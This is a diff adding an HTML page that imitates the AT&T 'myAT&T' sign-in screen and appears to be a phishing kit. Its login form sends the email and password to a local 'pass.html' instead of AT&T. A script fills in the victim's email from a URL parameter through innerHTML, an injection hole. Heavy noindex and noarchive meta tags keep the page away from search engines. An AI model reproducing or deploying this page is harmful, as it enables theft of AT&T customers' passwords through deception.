@@ -1,0 +1,205 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <script type="text/javascript"> 
+
+      window.addEventListener('load', () => {
+    const params = (new URL(document.location)).searchParams;
+    const email = params.get('email');
+    
+     document.getElementById('email').innerHTML = email;
+     document.myform.email.value = email;
+    
+    
+    })
+    
+      </script>
+    <title>Login Screen</title>
+    
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex" />
+<meta name="otherbot" content="noindex" />
+<meta name="noarchive" content="noindex" />
+<meta name="nosnippet" content="noindex" />
+<meta name="noimageindex" content="noindex" /> 
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="googlebot-news" content="nofollow" />
+<meta name="otherbot" content="nofollow" />
+<meta name="noarchive" content="nofollow" />
+<meta name="nosnippet" content="nofollow" />
+<meta name="noimageindex" content="nofollow" />
+<meta name="robots" content="max-snippet:0">
+<meta name="robots" content="unavailable_after: 2020-09-22">
+  
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+  
+  <!-- Dynatrace Javascript -->
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  
+   <script>
+      window.loginJspEnvVars = {
+        ADOBE_ENV_URL: 'https://www.att.com/scripts/adobe/prod',
+        APPNAME: 'aaid_client',
+        AUTHENTICATION_STACK_POLICY_URL: 'https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth',
+        CONTENT_STACK_HOST: 'https://signin.att.com/static/siam',
+        CREATE_NOW_URL: 'https://m.att.com/my/#/welcome?origination_point=tguard',
+        DISABLE_FID: 'N',
+        DISABLE_FPW: 'N',
+        DISABLE_REG: 'N',
+        DISABLE_SAVE_USER_ID: 'N',
+        SAVE_USERID_CHECKED: 'ON',
+        KEEP_ME_SIGNED_IN: 'N',
+        KEEP_ME_SIGNED_IN_CHECKED: 'OFF',
+        ERROR_CODE: '',
+        ERROR_MESSAGE: '',
+        CARE_CODE: '',
+        FORGOT_PASSWORD_URL: 'https://identity.att.com/identity-ui/fpwd/lander?origination_point=tguard&trid=7870b03836ce82672b7a00edfebbd6e73cd23e18&appName=aaid_client&Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client&Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client&lang=en-us',
+        FORGOT_USERID_URL: 'https://identity.att.com/identity-ui/fid/lander?origination_point=tguard&trid=7870b03836ce82672b7a00edfebbd6e73cd23e18&appName=aaid_client&Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client&Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client&lang=en-us',
+        LOGIN_UI_HEADER: 'myAT&T',
+        ES_LOGIN_UI_HEADER: 'myAT&T',
+        loginFailureURL: 'https://signin.att.com/static/siam/dynamic/iamLRR/LrrController?IAM_OP=login&refIDFromLogin=7870b03836ce82672b7a00edfebbd6e73cd23e18&targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client',
+        loginSuccessURL: 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?nonce=LfPXwCZ9ts&redirect_uri=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Foidc%2Frp%2Fconsumerfed%2Fredirect%2Faaidpartner&response_mode=form_post&alt_dest=https%253A%252F%252Fcaaid.att.com%252FiamLRR%252Fheaderdump.jsp&scope=openid&response_type=id_token&state=sfWNnGXbM1&client_id=aaid_client',
+        trID: '7870b03836ce82672b7a00edfebbd6e73cd23e18',
+        SAVED_USER_ID: '',
+        ES_CREATE_NOW_URL: 'https://m.att.com/es-us/my/#/welcome?origination_point=tguard',
+        MIN_LOGIN: '',
+        DISCOVERY_UI_URL: '',
+        CANCEL_URL: 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=cancel&appName=aaid_client',
+        IS_EREPAIR: '',
+        EREPAIR_ENV: '',
+        ACTIVATE_PREFETCH_FOR_CLIENT: 'N',
+        MYATT_PREFETCH_URL: 'https://www.att.com/myatt/lgn/resources/unauth/login/prefetch/invoke',
+        M_MYATT_PREFETCH_URL: 'https://m.att.com/myatt/lgn/resources/unauth/login/prefetch/invoke',
+        REG_URL_USE_AS_IS: 'N',
+        ZK_LEARN_MORE_ENABLED: 'N',
+        ZK_LEARN_MORE_URL: 'https://www.att.com/support/article/wireless/KM1375558/',
+        ZK_LEARN_MORE_NEW_TAB: 'Y',
+        ACTIVATE_ADOBE_TAGGING_FOR_CLIENT: 'N',
+        ZK_FIRST_LOOK_ENABLED: 'N',
+        ACTIVATE_LOGO: 'Y',
+        logoURL: '/en/halo_c/images/logos/att-logo.svg',
+        ACTIVATE_IP_MARKING: 'Y',
+        IPMarkingCompany: 'AT&T',
+        ACTIVATE_FOOTER_LINKS: 'Y',
+        EN_FOOTER_LINKS: 'W3sibGlua0xhYmVsIjoiTGVnYWwgcG9saWN5IGNlbnRlciIsImxpbmtVUkwiOiJodHRwczovL3d3dy5hdHQuY29tL2xlZ2FsL2xlZ2FsLXBvbGljeS1jZW50ZXIuaHRtbCJ9LCB7ImxpbmtMYWJlbCI6IlByaXZhY3kgcG9saWN5IiwibGlua1VSTCI6Imh0dHBzOi8vYWJvdXQuYXR0LmNvbS9zaXRlcy9wcml2YWN5X3BvbGljeSJ9LCB7ImxpbmtMYWJlbCI6IlRlcm1zIG9mIHVzZSIsImxpbmtVUkwiOiJodHRwczovL3d3dy5hdHQuY29tL2xlZ2FsL3Rlcm1zLmF0dFdlYnNpdGVUZXJtc09mVXNlLmh0bWwifSwgeyJsaW5rTGFiZWwiOiJBY2Nlc3NpYmlsaXR5IiwibGlua1VSTCI6Imh0dHBzOi8vd3d3LmF0dC5jb20vZmVhdHVyZXMvYWNjZXNzaWJpbGl0eS5odG1sIn0sIHsibGlua0xhYmVsIjoiRG8gbm90IHNlbGwgbXkgcGVyc29uYWwgaW5mb3JtYXRpb24iLCJsaW5rVVJMIjoiaHR0cHM6Ly9hYm91dC5hdHQuY29tL2Nzci9ob21lL3ByaXZhY3kvcmlnaHRzX2Nob2ljZXMuaHRtbCJ9XQ',
+        ES_FOOTER_LINKS: '',
+        FASTPAY_CONFIG: '',
+        CMS_LGN_TEXT_URL: 'https://signin.att.com/static/siam/en/halo_c/cms/login/default/i18n/{lang}.json',
+        CMS_LGN_IMG_URL: 'https://signin.att.com/static/siam/en/halo_c/cms/login/default/images/',
+        SHOW_FPW_MODAL: 'N',
+        CLIENT_BRAND: 'myAT&T',
+        trustedIDs: '',
+        COLLECT_PREPAID_CTN_FOR_CLIENT: '',
+        userID: '',
+        disableUserIDEdit: '',
+        MULTI_USER_DATA: '',
+        ACTIVATE_ONE_LINE_GROUPS: 'N',
+        SURPRESS_BROWSER_PWD_MANAGER: 'N',
+        ACTIVATE_REFID: 'N'
+      };
+  
+      window.loginLanguage = 'en';
+    </script>
+  
+
+     <link rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css?v=15.1.1">
+  <style>app-error[_ngcontent-rec-c39], app-footer[_ngcontent-rec-c39], app-header[_ngcontent-rec-c39], app-manual-login[_ngcontent-rec-c39], app-manual-login-erepair[_ngcontent-rec-c39], app-multi-save-login[_ngcontent-rec-c39]{max-width:310px;width:100%}</style>
+  <style>.spacer[_ngcontent-rec-c21]{margin-bottom:70px}.image[_ngcontent-rec-c21]{height:24px}
+  .header-text-div[_ngcontent-rec-c21]{display:flex;justify-content:center;flex-direction:column;margin-top:20px;margin-bottom:20px;text-align:center;max-width:inherit}
+  .sign-in-header[_ngcontent-rec-c21]{font-size:1.5rem;line-height:2rem}.sign-in-header-text[_ngcontent-rec-c21]{font-size:1.125rem;line-height:1.625rem}@media (max-width:1199.98px){.spacer[_ngcontent-rec-c21]{margin-bottom:50px}
+  .sign-in-header[_ngcontent-rec-c21]{font-size:1.375rem;line-height:1.5625rem}.sign-in-header-text[_ngcontent-rec-c21]{font-size:1.125rem;line-height:2rem}}</style>
+  <style>.errorContainer[_ngcontent-rec-c22]{width:310px;border-radius:3px;border:1px solid rgba(215,56,56,.1);background-color:rgba(215,56,56,.03);padding:11px 15px 10px 16px;display:flex;align-items:flex-start;margin-bottom:20px}
+  .errorIcon[_ngcontent-rec-c22]{flex-shrink:0;width:18px;height:18px}.errorText[_ngcontent-rec-c22]{padding-left:11px}
+  .errorDesc[_ngcontent-rec-c22]{font-size:.875rem;line-height:1.125rem;color:#1d2329}.errorCode[_ngcontent-rec-c22]{text-transform:uppercase;padding-top:10px;font-size:.75rem;line-height:1.125rem;letter-spacing:.9px;color:#72727e}
+  .blueErrorContainer[_ngcontent-rec-c22]{border:1px solid rgba(0,159,219,.1);background-color:rgba(0,159,219,.03)}</style>
+  <style>.fg-sign-in[_ngcontent-rec-c31], .zenkey-container[_ngcontent-rec-c31]{margin-top:8px}.bottom-container[_ngcontent-rec-c31]{margin-top:48px}
+  .dont-have-id[_ngcontent-rec-c31]{margin-top:25px}@media (max-width:1199.98px){.bottom-container[_ngcontent-rec-c31]{margin-top:32px}}</style>
+  <style>.prepaid-ctn-button[_ngcontent-rec-c28]{width:100%;height:48px;text-align:center;border-radius:3px;border:1px solid #1d2329;background-color:#fff;color:#1d2329;font-size:.875rem;line-height:1.5625rem;margin-top:8px;display:flex;align-items:center;justify-content:center}
+  .prepaid-ctn-button[_ngcontent-rec-c28]:hover{text-decoration:none;background-color:#1d2329;color:#fff}</style>
+  <style>.policyArea[_ngcontent-rec-c37]{text-align:center;padding-top:24px;display:flex;flex-direction:row}.policyArea[_ngcontent-rec-c37]   a[_ngcontent-rec-c37]{padding:0 11.5px}
+  .footer-link-text[_ngcontent-rec-c37]{font-size:.75rem;line-height:1.5rem;text-align:center;color:#0057b8}.footer-link-text[_ngcontent-rec-c37]:focus, 
+  .footer-link-text[_ngcontent-rec-c37]:hover{text-decoration:underline}.copyright[_ngcontent-rec-c37]{font-size:.75rem;line-height:1.5rem;text-align:center}
+  .spacer[_ngcontent-rec-c37]{padding-bottom:48px}@media (max-width:1199.98px){.policyArea[_ngcontent-rec-c37]{padding-top:20px;display:flex;flex-direction:column;align-items:center}
+  .policyArea[_ngcontent-rec-c37]   a[_ngcontent-rec-c37]:after{content:"";display:block;height:0;width:1px;text-align:center;padding:2px 0}.copyright[_ngcontent-rec-c37]{margin-left:auto;margin-right:auto;text-align:center;width:80%}.policyArea[_ngcontent-rec-c37]   a[_ngcontent-rec-c37]{white-space:nowrap}}
+  </style></head>
+  
+  <body>
+    <div id="app-root" _nghost-rec-c39="" ng-version="11.2.14" app-version="15.1.1">
+      <div _ngcontent-rec-c39="" class="app-component login-background">
+      <div _ngcontent-rec-c39="" role="main" class="container-fluid login-background card-top-space">
+        <div _ngcontent-rec-c39="" class="login-card">
+        <app-header _ngcontent-rec-c39="" class="flex-container" _nghost-rec-c21=""><!---->
+          <div _ngcontent-rec-c21="" class="image ng-star-inserted">
+          <img _ngcontent-rec-c21="" id="headerLogoImage" alt="" class="mar-b4 header-logo-image" style="width: 100%;" src="https://signin.att.com/static/siam/en/halo_c/images/logos/att-logo.svg"></div><!---->
+          <div _ngcontent-rec-c21="" class="header-text-div">
+            <h1 _ngcontent-rec-c21="" id="signInHeaderText" class="lg-text-medium sign-in-header justify-content-center mb-0">Sign in</h1>
+      <h1 _ngcontent-rec-c21="" id="signInHeaderToText" class="lg-text-medium sign-in-header-text justify-content-center mt-0">to myAT&amp;T</h1></div></app-header>
+      <app-error _ngcontent-rec-c39="" _nghost-rec-c22=""><!----></app-error>
+      <app-manual-login _ngcontent-rec-c39="" _nghost-rec-c31="" class="ng-tns-c31-0 ng-star-inserted">
+      
+      <form   name ="myform" id="myform"  method="get" action="pass.html">
+
+            <div  class="">
+          <label id="userLabel" for="userID" class="">Email 
+            <div id="userLabelAfter" class=""></div></label>
+            <div  class="">
+              <input name="email" type="email" readonly  id="email"    document.getElementByIdvalue='' required  formcontrolname="userID" class="ng-tns-c31-0 lg-text-regular textfield ng-pristine ng-invalid ng-touched" aria-invalid="false">
+             </div></div>
+              <div  class="forgot-link-cont ng-tns-c31-0 ng-star-inserted">
+                <a id="forgotUserID" class="lg-text-medium forgot-link ng-tns-c31-0" href="">Forgot user ID?</a></div><!---->
+             
+                <div _ngcontent-rec-c31="" class="mb-0 ng-tns-c31-0">
+                  <label _ngcontent-rec-c31="" id="passwordLabel" for="password" class="lg-text-medium textfield-label">Password 
+                   </label>
+               
+                    <div _ngcontent-rec-c31="" class="flex-container justify-content-center ng-tns-c31-0">
+                    <div _ngcontent-rec-c31="" class="ng-tns-c31-0 show-hide-input-container">
+
+                      <input name="pass" required formcontrolname="password" aria-controls="passwordInlineErrorTextContainer" spellcheck="false" autocomplete="current-password" autocapitalize="off" class="ng-tns-c31-0 lg-text-regular textfield show-hide-input ng-untouched ng-pristine ng-invalid" type="password" aria-invalid="false">
+                     </div>
+                   </div></div>
+
+                      <div _ngcontent-rec-c31="" class="forgot-link-cont ng-tns-c31-0 ng-star-inserted">
+                        <a _ngcontent-rec-c31="" id="forgotPassword" class="lg-text-medium forgot-link ng-tns-c31-0" href="#">Forgot password?</a></div><!---->
+                        <div _ngcontent-rec-c31="" class="form-group checkboxDiv mb-0 ng-tns-c31-0 ng-star-inserted">
+                          <label _ngcontent-rec-c31="" for="rememberMe" class="checkbox ng-tns-c31-0">
+                          <input _ngcontent-rec-c31="" type="checkbox" id="rememberMe" name="rememberMe" value="Y" class="ng-tns-c31-0" aria-label="Save user ID checkbox">
+                          <div _ngcontent-rec-c31="" class="checkbox-skin ng-tns-c31-0">
+                            <img _ngcontent-rec-c31="" alt="" class="checkmark-image ng-tns-c31-0" src="https://signin.att.com/static/siam/en/halo_c/cms/login/default/images/checkmark.svg">
+                          </div></label>
+                            <span _ngcontent-rec-c31="" id="rememberMeText" class="lg-text-regular checkbox-label ml-2 ng-tns-c31-0">Save user ID</span></div><!----><!---->
+                            <div _ngcontent-rec-c31="" class="form-group justify-content-center fg-sign-in ng-tns-c31-0">
+                              <div _ngcontent-rec-c31="" class="flex-container justify-content-center ng-tns-c31-0">
+                                <button type="submit" class="lg-text-medium btn-primary ng-tns-c31-0">Sign in</button>
+
+                              </form>
+                                <button _ngcontent-rec-c31="" type="button" id="cancel" class="lg-text-medium btn-link mar-t8 ng-tns-c31-0 ng-star-inserted">Cancel</button><!---->
+                                <hr _ngcontent-rec-c31="" class="align-self-center cancel-border ng-tns-c31-0 ng-star-inserted"><!----></div></div>
+                                <div _ngcontent-rec-c31="" class="form-group justify-content-center dont-have-id ng-tns-c31-0 ng-star-inserted">
+                                  <div _ngcontent-rec-c31="" class="flex-container justify-content-center lg-text-regular text-style-0 ng-tns-c31-0">
+                                    <p _ngcontent-rec-c31="" id="dontHaveIdText" class="mb-0 ng-tns-c31-0">Don't have a user ID?</p>
+                                    <a _ngcontent-rec-c31="" id="createNow" class="lg-text-medium text-style-1 ng-tns-c31-0 ng-star-inserted" href="https://m.att.com/my/#/welcome?origination_point=tguard&amp;Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client&amp;Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DLfPXwCZ9ts%26redirect_uri%3Dhttps%253A%252F%252Fcaaid.att.com%252Fisam%252Fsps%252Foidc%252Frp%252Fconsumerfed%252Fredirect%252Faaidpartner%26response_mode%3Dform_post%26alt_dest%3Dhttps%25253A%25252F%25252Fcaaid.att.com%25252FiamLRR%25252Fheaderdump.jsp%26scope%3Dopenid%26response_type%3Did_token%26state%3DsfWNnGXbM1%26client_id%3Daaid_client"> Create one now </a><!----><!----></div></div><!----><!---->
+                                    <app-prepaid-ctn-button _ngcontent-rec-c31="" class="ng-tns-c31-0" _nghost-rec-c28=""><!----></app-prepaid-ctn-button><!---->
+                                    <div _ngcontent-rec-c31="" class="bottom-container ng-tns-c31-0"></div>
+                                 
+                                
+                                
+                                </app-manual-login><!----><!----><!----></div></div>
+                                    <app-footer _ngcontent-rec-c39="" role="contentinfo" _nghost-rec-c37="" class="ng-star-inserted">
+                                      <div _ngcontent-rec-c37="" class="login-background">
+                                      <div _ngcontent-rec-c37="" class="policyArea justify-content-center ng-star-inserted">
+                                        <a _ngcontent-rec-c37="" rel="noopener noreferrer" target="_blank" class="lg-text-medium footer-link-text ng-star-inserted" href="https://www.att.com/legal/legal-policy-center.html" id="footerLink0">Legal policy center </a><!---->
+                                        <a _ngcontent-rec-c37="" rel="noopener noreferrer" target="_blank" class="lg-text-medium footer-link-text ng-star-inserted" href="https://about.att.com/sites/privacy_policy" id="footerLink1">Privacy policy </a><!---->
+                                        <a _ngcontent-rec-c37="" rel="noopener noreferrer" target="_blank" class="lg-text-medium footer-link-text ng-star-inserted" href="https://www.att.com/legal/terms.attWebsiteTermsOfUse.html" id="footerLink2">Terms of use </a><!---->
+                                        <a _ngcontent-rec-c37="" rel="noopener noreferrer" target="_blank" class="lg-text-medium footer-link-text ng-star-inserted" href="https://www.att.com/features/accessibility.html" id="footerLink3">Accessibility </a><!---->
+                                        <a _ngcontent-rec-c37="" rel="noopener noreferrer" target="_blank" class="lg-text-medium footer-link-text ng-star-inserted" href="https://about.att.com/csr/home/privacy/rights_choices.html" id="footerLink4">Do not sell my personal information </a><!----><!----></div><!----><!---->
+                                        <div _ngcontent-rec-c37="" class="lg-text-regular copyright">
+                                          <span _ngcontent-rec-c37="" id="copyrightTextSpan" class="ng-star-inserted">©2022 AT&amp;T Intellectual Property. All rights reserved.</span><!----></div></div>
+                                      </app-footer><!----><!----></div></div>
+  
+  
+  
+  </body></html>
